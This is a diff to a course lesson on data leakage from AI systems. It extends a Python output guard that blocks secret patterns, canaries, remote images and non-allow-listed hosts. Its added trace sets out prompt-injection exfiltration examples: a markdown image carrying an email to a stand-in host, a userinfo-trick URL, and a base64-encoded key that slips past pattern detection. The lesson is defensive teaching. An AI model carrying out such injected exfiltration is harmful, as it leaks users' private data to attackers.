@@ -4,8 +4,8 @@ module: safety-security
 name: Data leakage
 kind: concept
 difficulty: core
-est_minutes: 15
-status: fact-checked
+est_minutes: 17
+status: reviewed
 related:
   - safety-security/pii-redaction
   - safety-security/cross-tenant-data-leakage
@@ -94,6 +94,23 @@ Semantic caches and agent memory keyed without the user or tenant return one per
 The cross-tenant lesson covers the mechanics; the principle is the same: the key must include the
 principal.
 
+### Channel 8: people and unsanctioned tools
+The cheapest leak needs no attacker: an employee pastes source code, a contract or a customer export into
+a consumer chatbot under a personal account, outside any data-processing agreement. It was widely reported
+in 2023 that engineers at a large electronics maker had done exactly this with internal code. Technical
+controls here are blunt (egress proxies, browser DLP); the effective one is providing a sanctioned tool
+that is as convenient, because people route around bans.
+
+### Ordering the controls: prevent, contain, detect
+The channels share one design rule: put the weight on controls that do not need to recognise the data.
+*Prevention* (minimisation, tokenisation, not training on it) works on data that never entered.
+*Containment* (egress allow-lists, no remote image rendering, scoped stores) works whatever the model
+writes, because it limits where bytes can go rather than inspecting them. *Detection* (output DLP,
+canaries) comes last because it is defeatable: a model instructed to base64-encode a key, split it across
+words, or translate a paragraph defeats a pattern match, while it cannot defeat an egress allow-list that
+has no route to the attacker. Detection still earns its place for accidental leaks, which are not
+adversarial and so do keep their recognisable format.
+
 ## Example
 An output guard that runs on every completion and every tool call before execution. It blocks known secret
 formats and planted canary tokens, strips remote markdown images (the silent-GET exfiltration channel), and
@@ -110,6 +127,7 @@ SECRET_PATTERNS = {
 }
 CANARY = re.compile(r"CANARY-[a-z]+-[0-9a-f]{4}")            # planted in confidential documents
 REMOTE_IMG = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")    # markdown image => silent GET
+HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)                   # same channel if HTML is rendered
 ALLOWED_EGRESS = {"api.internal.example", "docs.example.com"}
 
 class LeakBlocked(Exception):
@@ -125,12 +143,14 @@ def scan_text(text: str, where: str) -> None:
 def guard_completion(text: str) -> str:
     scan_text(text, "model output")
     # the client would fetch this URL and leak whatever sits in its query string
+    text = HTML_IMG.sub("[image removed]", text)
     return REMOTE_IMG.sub(lambda m: f"[image removed: {m.group(1).split('?')[0]}]", text)
 
 def guard_tool_call(name: str, args: dict) -> None:
     flat = " ".join(str(v) for v in args.values())
     scan_text(flat, f"arguments of {name}")
     for host in re.findall(r"https?://([^/\s?#]+)", flat):
+        host = host.lower().rsplit("@", 1)[-1].split(":")[0]  # drop userinfo and port
         if host not in ALLOWED_EGRESS:
             raise LeakBlocked(f"{name} would contact non-allow-listed host {host}")
 
@@ -139,6 +159,14 @@ def guard_tool_call(name: str, args: dict) -> None:
 #   guard_tool_call(call.name, call.args); then execute the call
 ```
 
+Trace two attacks through it. An injected document makes the model write
+`![s](https://x.example/p.png?d=jane@corp.example)`: `guard_completion` rewrites it to
+`[image removed: https://x.example/p.png]`, so the client never issues the GET and the query string never
+leaves. An injected instruction makes the agent call `fetch_url(url="https://docs.example.com@x.example/")`:
+the userinfo trick makes the real host `x.example`, which the normalisation exposes and the allow-list
+rejects. Now the attack the guard does not stop: the model base64-encodes an AWS key into a tool argument
+addressed to an allow-listed host. The secret pattern misses it, so the only thing that saves you is that
+the allow-listed host is one you control. That is the prevent-contain-detect ordering in miniature.
 Pair this with the inbound side: minimisation and tokenisation before the prompt is built, and redaction in
 the tracing SDK, so the guard is the last line rather than the only one.
 
@@ -151,6 +179,9 @@ the tracing SDK, so the guard is the last line rather than the only one.
 - Output DLP with high-precision patterns rarely blocks legitimate answers but misses paraphrased or
   partially quoted secrets; widening the patterns raises false positives until users route around the
   guard, so tune it on a sample of real completions.
+- Egress allow-lists stop exfiltration regardless of encoding, but they break agents whose job is open-ended
+  browsing; for those, split the work so the browsing agent holds no private data and the agent with
+  private data has no open egress, instead of loosening the list.
 - Retrieval instead of fine-tuning keeps customer data deletable and filterable, but it costs retrieval
   engineering and prompt tokens on every call; fine-tuning is only the right trade when the data is not
   sensitive or is fully synthetic.
@@ -164,6 +195,9 @@ the tracing SDK, so the guard is the last line rather than the only one.
   unfamiliar hosts with suspiciously long query strings in the client's network log.
 - Treating embeddings as safe to share with a lower-trust vendor or region; the symptom is a data-residency
   finding when someone asks where the vectors live.
+- Allow-listing a host that stores or reflects what it receives (a shared bucket, a public paste or issue
+  tracker, an endpoint with an open redirect); the symptom is zero blocked-egress events while data still
+  turns up outside, because the attacker reads it from the allowed host.
 - Fine-tuning on raw support tickets and testing only task accuracy; the symptom is the model emitting a
   real customer's name and order details when prompted with a similar ticket.
 
